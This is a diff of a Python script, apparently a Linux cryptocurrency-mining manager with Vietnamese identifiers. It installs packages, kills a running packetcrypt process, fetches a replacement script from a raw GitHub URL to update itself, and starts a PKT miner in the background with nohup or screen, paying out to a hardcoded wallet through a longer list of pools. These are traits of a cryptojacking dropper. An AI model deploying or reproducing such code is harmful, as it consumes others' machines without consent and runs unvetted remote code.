@@ -23,18 +23,26 @@ if operate_system == 'lin':
         os.system('apt-get update -y')
         #os.system ('apt --fix-broken install -y')
         os.system('apt-get install -y screen')
+        os.system('apt-get install -y python-pip')
+        os.system('apt-get install -y python3-pip')
+    except:
+        pass
+    try:
         os.system('pip install psutil')
         os.system('pip3 install psutil')
     except:
         pass
 import psutil
-
+try:
+    os.system('pkill packetcrypt')
+except:
+    pass
 command_xmrig_default = '-c /opt/xmrig_linux/config.json'
 while True:
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.0
+    version_chinh = 6.0
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_chinh'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao.py'
     try:
@@ -283,7 +291,7 @@ while True:
         except:
             pass
         if pkt_dachay == False:
-            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world http://pool.pktpool.io -t 2' % pkt_name
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.k1m3r4.com/ http://p.master.pktdigger.com/ http://pool.pkteer.com http://pool.pkthash.com -t 3' % pkt_name
             print(command)
             if os.path.isfile('/usr/bin/screen'):
                 print('Co chuong trinh screen')
@@ -293,5 +301,5 @@ while True:
                 os.system ('nohup %s &' %command)
             else:
                 os.system ('%s &' %command)
-        time.sleep(thoi_gian_nghi)
+    time.sleep(thoi_gian_nghi)
 
